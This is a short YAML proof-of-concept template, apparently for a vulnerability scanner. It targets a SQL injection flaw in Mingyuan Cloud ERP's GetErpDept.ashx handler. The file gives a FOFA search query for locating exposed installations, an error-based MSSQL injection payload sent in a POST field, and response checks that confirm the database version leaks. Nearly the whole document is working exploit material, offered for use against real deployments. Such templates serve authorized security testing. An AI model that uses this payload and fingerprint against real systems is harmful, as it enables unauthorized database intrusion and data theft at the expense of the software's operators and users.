id: poc-yaml-mingyuanyun-erp-geterpdept-ashx-sqli
info:
  name: 明源地产ERP GetErpDept.ashx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  - 两高一弱
  finger: 明源云ERP
  fofa: app="明源云-ERP"
requests:
- method: POST
  path: /XmjdUI/Handle/GetErpDept.ashx
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: isCompany=') and 1=@@VERSION--
  expression: status_code == 200 && contains(body,"Microsoft SQL Server") && contains(body,"\"server\":")  &&
    contains(content_type,"application/json") && matches(body,"转换成数据类型(.*?)时失败") &&
    matches(body,"在将(.*?)值")
variables: {}
transport: http
